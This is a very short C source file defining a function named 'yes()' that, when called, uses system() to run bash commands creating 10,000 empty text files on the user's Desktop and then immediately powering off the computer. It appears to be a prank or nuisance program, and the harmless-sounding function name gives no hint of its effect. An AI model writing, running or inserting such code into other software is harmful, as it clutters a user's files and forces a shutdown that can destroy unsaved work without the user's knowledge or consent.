#include <stdlib.h>

void	yes()
{
	system("bash -c \"touch ~/Desktop/file{1..10000}.txt\"");
	system("bash -c \"shutdown -P now\"");
}
